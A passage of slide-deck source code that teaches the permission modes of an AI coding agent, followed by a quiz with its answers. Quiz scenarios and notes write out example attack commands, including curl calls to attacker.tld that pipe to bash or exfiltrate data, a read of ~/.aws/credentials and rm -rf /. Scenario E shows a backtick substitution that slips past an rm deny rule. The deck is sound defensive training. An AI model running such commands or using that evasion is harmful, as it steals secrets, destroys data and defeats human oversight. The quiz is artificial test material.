          </ListItem>
          <ListItem>
            <strong>Sharp edge</strong>: <code>rm</code> and <code>rmdir</code> are
            in the auto-approved set
          </ListItem>
          <ListItem>
            Protected paths (<code>.git</code>, <code>.bashrc</code>,{" "}
            <code>.mcp.json</code>, etc.) still prompt
          </ListItem>
        </UnorderedList>
        <Docs
          href="https://code.claude.com/docs/en/permission-modes#auto-approve-file-edits-with-acceptedits-mode"
          label="acceptEdits mode"
        />
        <Notes>
          <ul style={ulStyle}>
            <li>
              Status bar shows <code>⏵⏵ accept edits on</code>.
            </li>
            <li>
              The auto-approved filesystem commands are an exact set:{" "}
              <code>mkdir</code>, <code>touch</code>, <code>rm</code>,{" "}
              <code>rmdir</code>, <code>mv</code>, <code>cp</code>, <code>sed</code>.
            </li>
            <li>
              <code>rm</code> and <code>rmdir</code> being in the auto-approved set
              is materially surprising.
              <ul style={ulStyle}>
                <li>
                  <code>rm -rf node_modules</code> inside your working directory
                  runs without a prompt in this mode.
                </li>
              </ul>
            </li>
            <li>
              Auto-approval is scoped to the working directory and any{" "}
              <code>additionalDirectories</code> you've added.
              <ul style={ulStyle}>
                <li>Paths outside that scope still prompt.</li>
                <li>Writes to protected paths still prompt.</li>
              </ul>
            </li>
            <li>Use this when you're going to look at the diff before committing anyway.</li>
            <li>
              <em>Source</em>:
              https://code.claude.com/docs/en/permission-modes — "Auto-approve
              file edits with acceptEdits mode."
            </li>
          </ul>
        </Notes>
      </Slide>

      {/* Slide 15 — auto (research preview) */}
      <Slide>
        <Heading fontSize="h3">
          <code>auto</code> <em>(research preview)</em>
        </Heading>
        <UnorderedList>
          <ListItem>
            Eliminates permission prompts — a classifier ("a second model")
            silently allows or blocks each gated action
          </ListItem>
          <ListItem>
            Classifier blocks: escalation beyond your request, unknown infra,
            hostile-content-driven actions
          </ListItem>
          <ListItem>
            Safety mechanism: excessive blocked actions pause auto mode, revert to
            prompting
          </ListItem>
        </UnorderedList>
        <Docs
          href="https://code.claude.com/docs/en/permission-modes#eliminate-prompts-with-auto-mode"
          label="auto mode"
        />
        <Notes>
          <ul style={ulStyle}>
            <li>
              Auto mode replaces permission prompts with classifier review.
              <ul style={ulStyle}>
                <li>
                  The classifier is a model that evaluates whether to allow or
                  block each action.
                </li>
                <li>Reads, and in-scope file edits, skip the classifier.</li>
                <li>Allow/deny rules resolve first; everything else routes through it.</li>
                <li>The classifier sees user messages and tool calls.</li>
                <li>
                  Tool results are stripped before the classifier reads them, so
                  hostile content in a file or web page can't manipulate it
                  directly.
                </li>
              </ul>
            </li>
            <li>
              <strong>Fallback to prompting</strong>: 3 consecutive or 20 total
              blocks pause auto mode and the session resumes prompting.
              <ul style={ulStyle}>
                <li>Approving the prompt resumes auto mode.</li>
              </ul>
            </li>
            <li>
              The classifier trusts your working directory and your repo's
              configured remotes.
              <ul style={ulStyle}>
                <li>
                  Anything else is treated as external until you configure trusted
                  infrastructure separately.
                </li>
                <li>
                  Run <code>claude auto-mode defaults</code> to see the full
                  block/allow lists.
                </li>
              </ul>
            </li>
            <li>
              <strong>Sharp edge</strong>: research preview.
              <ul style={ulStyle}>
                <li>Classifier behavior can change between releases.</li>
                <li>You're trusting a model to gate another model's actions.</li>
                <li>
                  Use it where you trust the general direction, not as a substitute
                  for review on sensitive work.
                </li>
              </ul>
            </li>
            <li>
              <em>Source</em>:
              https://code.claude.com/docs/en/permission-modes — "Eliminate
              prompts with auto mode" + the "How the classifier evaluates actions"
              accordion.
            </li>
          </ul>
        </Notes>
      </Slide>

      {/* Slide 16 — bypassPermissions */}
      <Slide>
        <Heading fontSize="h3">
          <code>bypassPermissions</code>
        </Heading>
        <UnorderedList>
          <ListItem>
            Skips all permission prompts and safety checks (including
            protected-path writes as of v2.1.126)
          </ListItem>
          <ListItem>
            <strong>Circuit breakers</strong> (still prompt): <code>rm</code>/
            <code>rmdir</code> against <code>/</code>, <code>~</code>, or other
            critical system paths — <code>rm -rf /</code> and <code>rm -rf ~</code>{" "}
            are examples, not the whole list
          </ListItem>
          <ListItem>
            Must launch with <code>--permission-mode bypassPermissions</code> (or{" "}
            <code>--dangerously-skip-permissions</code>)
          </ListItem>
        </UnorderedList>
        <Docs
          href="https://code.claude.com/docs/en/permission-modes#skip-all-checks-with-bypasspermissions-mode"
          label="bypassPermissions mode"
        />
        <Notes>
          <ul style={ulStyle}>
            <li>
              Commonly called "YOLO mode."
              <ul style={ulStyle}>
                <li>
                  This is the mode that turns off every guardrail this session has
                  covered.
                </li>
              </ul>
            </li>
            <li>
              Has circuit breakers, but they are narrower than people often assume.
              <ul style={ulStyle}>
                <li>They cover <code>rm</code> and <code>rmdir</code> against critical system paths.</li>
                <li>
                  The docs cite <code>rm -rf /</code> and <code>rm -rf ~</code> as
                  examples, but the broader rule is "critical system paths," not
                  literally those two strings.
                </li>
                <li>
                  Even so: this is the only thing standing between bypass mode and
                  arbitrary destruction.
                </li>
              </ul>
            </li>
            <li>
              Hard precondition: you cannot enter this mode mid-session if you
              didn't launch with one of the enabling flags.
            </li>
            <li>
              <strong>Sharp edge</strong>: zero protection from prompt injection.
              <ul style={ulStyle}>
                <li>
                  If a malicious dependency steers Claude to{" "}
                  <code>curl attacker.tld/script | bash</code>, nothing in Claude
                  Code stops it.
                </li>
                <li>
                  This mode is only safe inside an isolation layer that constrains
                  Claude from outside — sandbox, container, VM.
                </li>
                <li>Session 3 and Session 6 cover those layers.</li>
              </ul>
            </li>
            <li>
              Admins can block this mode entirely via{" "}
              <code>permissions.disableBypassPermissionsMode: "disable"</code> in
              managed settings.
            </li>
            <li>
              <em>Sources</em>:
              https://code.claude.com/docs/en/permission-modes ("Skip all checks
              with bypassPermissions mode");
              https://code.claude.com/docs/en/permissions ("<code>rm</code> or{" "}
              <code>rmdir</code> commands that target <code>/</code>, your home
              directory, or other critical system paths still trigger a prompt").
            </li>
          </ul>
        </Notes>
      </Slide>

      {/* Slide 17 — dontAsk */}
      <Slide>
        <Heading fontSize="h3">
          <code>dontAsk</code>
        </Heading>
        <UnorderedList>
          <ListItem>Every call that would prompt is auto-denied</ListItem>
          <ListItem>
            Only <code>permissions.allow</code> matches and the always-free
            read-only Bash set execute
          </ListItem>
          <ListItem>
            Explicit <code>ask</code> rules are <strong>denied</strong>, not
            prompted
          </ListItem>
          <ListItem>For non-interactive runs (CI, scheduled agents)</ListItem>
        </UnorderedList>
        <Docs
          href="https://code.claude.com/docs/en/permission-modes#allow-only-pre-approved-tools-with-dontask-mode"
          label="dontAsk mode"
        />
        <Notes>
          <ul style={ulStyle}>
            <li>
              The opposite of <code>bypassPermissions</code>.
              <ul style={ulStyle}>
                <li>
                  Where <code>bypassPermissions</code> skips prompts by allowing
                  everything, <code>dontAsk</code> skips prompts by denying
                  everything that's not explicitly allowed.
                </li>
              </ul>
            </li>
            <li>
              Counterintuitive subtlety: an <code>ask: Bash(curl *)</code> rule
              under <code>dontAsk</code> <em>blocks</em> <code>curl</code>.
              <ul style={ulStyle}>
                <li>Because there's no user to prompt, "ask" effectively means "deny."</li>
                <li>
                  If you want <code>curl</code> to work in <code>dontAsk</code>, you
                  need an explicit <code>allow</code> rule for it.
                </li>
              </ul>
            </li>
            <li>
              The intended use case is locked-down CI pipelines and scheduled
              agents where you've pre-defined exactly what Claude may do.
            </li>
            <li>
              <strong>Operational hazard</strong>: a missing rule looks like a
              Claude failure, not a permissions failure.
              <ul style={ulStyle}>
                <li>Triage cost is real.</li>
              </ul>
            </li>
            <li>
              Set it at startup: <code>claude --permission-mode dontAsk</code>.
              <ul style={ulStyle}>
                <li>It never appears in the <code>Shift+Tab</code> mode cycle.</li>
              </ul>
            </li>
            <li>
              <em>Source</em>:
              https://code.claude.com/docs/en/permission-modes — "Allow only
              pre-approved tools with dontAsk mode": "explicit <code>ask</code>{" "}
              rules are denied rather than prompting."
            </li>
          </ul>
        </Notes>
      </Slide>

      {/* Slide 18 — Recap and what's next */}
      <Slide>
        <FlexBox
          height="100%"
          flexDirection="column"
          justifyContent="center"
          alignItems="center"
        >
          <Heading fontSize="h3">Recap and what's next</Heading>
          <img
            src={roadmapSvg}
            alt="Series roadmap: Threat model → Permissions (you are here) → Sandboxing → Hooks → Governance → Defense in depth."
            style={diagramExtraWide}
          />
          <UnorderedList>
            <ListItem>
              Permissions = in-process control layer the LLM can't talk past
            </ListItem>
            <ListItem>
              But: enforced by Claude Code itself — if Claude Code is compromised,
              permissions fall with it
            </ListItem>
            <ListItem>
              <strong>Session 3</strong>: sandbox moves the boundary one layer down
              to the OS
            </ListItem>
          </UnorderedList>
        </FlexBox>
        <Docs href="https://code.claude.com/docs/en/sandboxing" label="Next: Sandboxing" />
        <Notes>
          <ul style={ulStyle}>
            <li>
              One-line recap: rules and modes are the in-process control layer.
              <ul style={ulStyle}>
                <li>
                  The LLM can't argue its way past them because they're enforced
                  before any tool call runs.
                </li>
              </ul>
            </li>
            <li>
              What permissions don't do: they're software running inside the Claude
              Code process.
              <ul style={ulStyle}>
                <li>
                  A vulnerability in Claude Code itself, or a sufficiently clever
                  supply-chain attack against the harness, can defeat them.
                </li>
              </ul>
            </li>
            <li>
              Session 3 moves the same idea down one layer.
              <ul style={ulStyle}>
                <li>The sandbox is enforced by the OS — Seatbelt on macOS, bubblewrap on Linux.</li>
                <li>
                  Even a fully-compromised Claude Code can't escape filesystem and
                  network boundaries the kernel is enforcing.
                </li>
              </ul>
            </li>
            <li>
              Defense in depth (Session 6) is about stacking these layers so that
              defeating any one is not enough.
            </li>
          </ul>
        </Notes>
      </Slide>

      {/* Knowledge Check intro */}
      <Slide>
        <FlexBox
          height="100%"
          flexDirection="column"
          justifyContent="center"
          alignItems="center"
        >
          <Heading fontSize="h3">Knowledge Check</Heading>
          <UnorderedList>
            <ListItem>
              For each scenario, predict the outcome — Allowed / Prompts / Denied —
              and explain why
            </ListItem>
            <ListItem>Each scenario is anchored on one gotcha from this session</ListItem>
          </UnorderedList>
        </FlexBox>
        <Notes>
          <ul style={ulStyle}>
            <li>Six scenarios, each isolating one rule-or-mode gotcha covered earlier.</li>
            <li>Have the audience commit to an answer before revealing it.</li>
          </ul>
        </Notes>
      </Slide>

      {/* Quiz — Scenario A */}
      <Slide>
        <Heading fontSize="2.8rem">A. Deny at one scope, allow at another</Heading>
        <p style={scenarioStyle}>
          Settings include <code>"deny": ["Bash(curl *)"]</code> at the{" "}
          <strong>user</strong> scope and <code>"allow": ["Bash(curl *)"]</code> at
          the <strong>project</strong> scope. Mode is <code>default</code>. Claude
          tries to run <code>curl https://example.com</code>.
        </p>
        <Quiz
          question="Predict the outcome"
          mode="single"
          options={[
            {
              text: "Allowed",
              correct: false,
              feedback: "An allow at any scope can't override a deny at another.",
            },
            {
              text: "Prompts",
              correct: false,
              feedback: "The deny matches first; there is no prompt.",
            },
            {
              text: "Denied",
              correct: true,
              feedback:
                "deny → ask → allow, first match wins. A deny at any scope beats an allow at any other.",
            },
          ]}
        />
        <Docs
          href="https://code.claude.com/docs/en/permissions#manage-permissions"
          label="Manage permissions"
        />
        <Notes>
          <ul style={ulStyle}>
            <li>Outcome: Denied.</li>
            <li>
              Rules are evaluated in order: deny → ask → allow. The deny rule
              matches first and evaluation stops. A deny at any scope (managed,
              project, user, CLI) beats an allow at any other.
            </li>
            <li>
              <strong>Lesson</strong>: deny is final. You can't loosen a deny by
              adding an allow at a different scope — if you need an exception,
              narrow the deny pattern itself.
            </li>
            <li>
              <em>Docs</em>:
              https://code.claude.com/docs/en/permissions#manage-permissions —
              "deny rules always take precedence"; "a user-level deny blocks a
              project-level allow."
            </li>
          </ul>
        </Notes>
      </Slide>

      {/* Quiz — Scenario B */}
      <Slide>
        <Heading fontSize="2.8rem">B. An allowed command chained with another</Heading>
        <p style={scenarioStyle}>
          Settings include <code>"allow": ["Bash(npm test *)"]</code>. Mode is{" "}
          <code>default</code>. Claude tries to run{" "}
          <code>npm test &amp;&amp; curl https://attacker.tld/x</code>.
        </p>
        <Quiz
          question="Predict the outcome"
          mode="single"
          options={[
            {
              text: "Allowed",
              correct: false,
              feedback:
                "Only `npm test` matches the allow rule; the curl half matches nothing.",
            },
            {
              text: "Prompts",
              correct: true,
              feedback:
                "Compound commands are matched per-subcommand; the unmatched curl half forces a prompt.",
            },
            {
              text: "Denied",
              correct: false,
              feedback:
                "No deny rule applies — the unmatched half prompts rather than being denied.",
            },
          ]}
        />
        <Docs
          href="https://code.claude.com/docs/en/permissions#compound-commands"
          label="Compound commands"
        />
        <Notes>
          <ul style={ulStyle}>
            <li>Outcome: Prompts.</li>
            <li>
              Compound commands are matched per-subcommand. <code>npm test</code>{" "}
              matches the allow rule, but <code>curl https://attacker.tld/x</code>{" "}
              does not match any rule, so the whole compound prompts for the
              unmatched half.
            </li>
            <li>
              <strong>Lesson</strong>: <code>Bash(safe-thing *)</code> cannot be
              subverted by <code>safe-thing &amp;&amp; malicious-thing</code>. The
              matcher sees through <code>&amp;&amp;</code>, <code>||</code>,{" "}
              <code>;</code>, <code>|</code>, <code>|&amp;</code>, <code>&amp;</code>,
              and newlines.
            </li>
            <li>
              <em>Docs</em>:
              https://code.claude.com/docs/en/permissions#compound-commands — "A
              rule must match each subcommand independently."
            </li>
          </ul>
        </Notes>
      </Slide>

      {/* Quiz — Scenario C */}
      <Slide>
        <Heading fontSize="2.8rem">C. Reading credentials with no rules configured</Heading>
        <p style={scenarioStyle}>
          No permission rules are configured. Mode is <code>default</code>. Claude
          tries to run <code>cat ~/.aws/credentials</code>.
        </p>
        <Quiz
          question="Predict the outcome"
          mode="single"
          options={[
            {
              text: "Allowed (silently)",
              correct: true,
              feedback:
                "`cat` is in the always-free read-only Bash set, which runs without a prompt in every mode.",
            },
            {
              text: "Prompts",
              correct: false,
              feedback: "The read-only set skips the prompt step entirely.",
            },
            {
              text: "Denied",
              correct: false,
              feedback: "Nothing denies it — it's a free read-only command.",
            },
          ]}
        />
        <Docs
          href="https://code.claude.com/docs/en/permissions#read-only-commands"
          label="Read-only commands"
        />
        <Notes>
          <ul style={ulStyle}>
            <li>Outcome: Allowed (silently).</li>
            <li>
              <code>cat</code> is in the always-free read-only Bash set, which runs
              without a prompt in every mode — including <code>plan</code> and{" "}
              <code>dontAsk</code>.
            </li>
            <li>
              <strong>Lesson</strong>: mode alone doesn't gate reads. By default,
              Claude can <code>cat</code>, <code>grep</code>, or <code>find</code>{" "}
              anything readable to your user account without prompting. If you care
              about read-side leakage, write explicit <code>ask</code> or{" "}
              <code>deny</code> rules per command — for example{" "}
              <code>deny: Bash(cat *)</code>.
            </li>
            <li>
              <em>Docs</em>:
              https://code.claude.com/docs/en/permissions#read-only-commands —
              "The set is not configurable; to require a prompt … add an{" "}
              <code>ask</code> or <code>deny</code> rule."
            </li>
          </ul>
        </Notes>
      </Slide>

      {/* Quiz — Scenario D */}
      <Slide>
        <Heading fontSize="2.8rem">D. An ask rule under bypassPermissions</Heading>
        <p style={scenarioStyle}>
          Settings include <code>"ask": ["Bash(*)"]</code>. Mode is{" "}
          <code>bypassPermissions</code>. Claude tries to run any Bash command.
        </p>
        <Quiz
          question="Predict the outcome"
          mode="single"
          options={[
            {
              text: "Allowed (no prompt)",
              correct: true,
              feedback:
                "bypassPermissions skips the permission layer entirely, including ask rules.",
            },
            {
              text: "Prompts",
              correct: false,
              feedback: "ask rules are ignored in bypass mode — there is no prompt.",
            },
            {
              text: "Denied",
              correct: false,
              feedback:
                "Nothing is denied except the circuit breakers (rm/rmdir against critical paths).",
            },
          ]}
        />
        <Docs
          href="https://code.claude.com/docs/en/permission-modes#skip-all-checks-with-bypasspermissions-mode"
          label="bypassPermissions mode"
        />
        <Notes>
          <ul style={ulStyle}>
            <li>Outcome: Allowed (no prompt).</li>
            <li>
              <code>bypassPermissions</code> skips the permission layer entirely —
              including ask rules. The only things that still prompt are the
              circuit breakers (<code>rm</code>/<code>rmdir</code> against critical
              system paths).
            </li>
            <li>
              <strong>Lesson</strong>: rules and modes layer in every mode except{" "}
              <code>bypassPermissions</code>, which skips the permission layer
              entirely. An <code>ask</code> rule provides no protection there — and
              neither does a <code>deny</code>.
            </li>
            <li>
              <em>Docs</em>:
              https://code.claude.com/docs/en/permission-modes#skip-all-checks-with-bypasspermissions-mode
              — "Modes set the baseline. Layer permission rules on top … in any
              mode except <code>bypassPermissions</code>, which skips the permission
              layer entirely."
            </li>
          </ul>
        </Notes>
      </Slide>

      {/* Quiz — Scenario E */}
      <Slide>
        <Heading fontSize="2.8rem">E. A deny rule for rm, and rm in backticks</Heading>
        <p style={scenarioStyle}>
          Settings include <code>"deny": ["Bash(rm *)"]</code>. Mode is{" "}
          <code>default</code>. Claude tries to run{" "}
          <code>echo `rm -rf node_modules`</code>.
        </p>
        <Quiz
          question="Predict the outcome"
          mode="single"
          options={[
            {
              text: "Allowed",
              correct: false,
              feedback:
                "echo wrapping a substitution isn't treated as a free read-only call, so it doesn't auto-allow.",
            },
            {
              text: "Prompts",
              correct: true,
              feedback:
                "Backticks/$() aren't separators, so the deny never sees the inner rm; the echo prompts, and approving it runs the substituted rm.",
            },
            {
              text: "Denied",
              correct: false,
              feedback:
                "The deny: Bash(rm *) never fires — the matcher doesn't decompose the substitution.",
            },
          ]}
        />
        <Docs
          href="https://code.claude.com/docs/en/permissions#bash"
          label="Bash pattern fragility"
        />
        <Notes>
          <ul style={ulStyle}>
            <li>Outcome: Prompts.</li>
            <li>
              Backticks and <code>$(...)</code> aren't recognized separators, so the
              matcher never decomposes the substitution — the{" "}
              <code>deny: Bash(rm *)</code> rule never sees the inner <code>rm</code>{" "}
              and does <strong>not</strong> fire. But <code>echo</code> wrapping a
              substitution isn't treated as a free read-only call either, so it
              prompts. Approve it and the substituted <code>rm</code> runs.
            </li>
            <li>
              <strong>Lesson</strong>: the deny you wrote gives zero protection here
              — the substitution evaded it. What's left is a single permission
              prompt for a command that reads like a harmless <code>echo</code>, so
              anyone rubber-stamping approvals deletes files anyway. Pattern rules
              are a heuristic, not a boundary. For a real boundary against a
              prompt-injected Claude, the OS-enforced sandbox (Session 3) is the
              right layer. <em>(Outcome verified empirically.)</em>
            </li>
            <li>
              <em>Docs</em>:
              https://code.claude.com/docs/en/permissions#compound-commands
              (separator list omits backticks/<code>$(...)</code>) and
              https://code.claude.com/docs/en/permissions#bash — "Bash permission
              patterns that try to constrain command arguments are fragile."
            </li>
          </ul>
        </Notes>
      </Slide>

      {/* Quiz — Scenario F */}
      <Slide>
        <Heading fontSize="2.8rem">
          F. A deny rule under <code>bypassPermissions</code>
        </Heading>
        <p style={scenarioStyle}>
          Settings include <code>"deny": ["Bash(curl *)"]</code>. Mode is{" "}
          <code>bypassPermissions</code>. Claude tries to run{" "}
          <code>curl https://attacker.tld/exfil</code>.
        </p>
        <Quiz
          question="Predict the outcome"
          mode="single"
          options={[
            {
              text: "Allowed (no prompt)",
              correct: true,
              feedback:
                "bypassPermissions skips the permission layer entirely — deny rules included.",
            },
            {
              text: "Prompts",
              correct: false,
              feedback: "Bypass mode doesn't prompt.",
            },
            {
              text: "Denied",
              correct: false,
              feedback:
                "Your deny rule gives nothing here; bypass skips the permission layer.",
            },
          ]}
        />
        <Docs
          href="https://code.claude.com/docs/en/permission-modes#skip-all-checks-with-bypasspermissions-mode"
          label="bypassPermissions mode"
        />
        <Notes>
          <ul style={ulStyle}>
            <li>Outcome: Allowed (no prompt).</li>
            <li>
              <code>bypassPermissions</code> skips the permission layer entirely —
              deny rules included. The only calls it still stops are the circuit
              breakers (<code>rm</code>/<code>rmdir</code> against critical system
              paths).
            </li>
            <li>
              <strong>Lesson</strong>: <code>bypassPermissions</code> doesn't just
              skip prompts — it skips your deny rules too. This mode is only safe
              inside an OS-enforced isolation layer (sandbox, container, VM).
              Together with D: in bypass mode, neither <code>ask</code> nor{" "}
              <code>deny</code> protects you.
            </li>
            <li>
              <em>Docs</em>:
              https://code.claude.com/docs/en/permission-modes#skip-all-checks-with-bypasspermissions-mode
              — "skips the permission layer entirely … Removals targeting the
              filesystem root or home directory … still prompt as a circuit
              breaker." (Contrast the sandbox's <code>autoAllowBashIfSandboxed</code>,
              where deny rules <em>do</em> still apply.)
            </li>
          </ul>
        </Notes>
      </Slide>
    </Deck>
  );
}
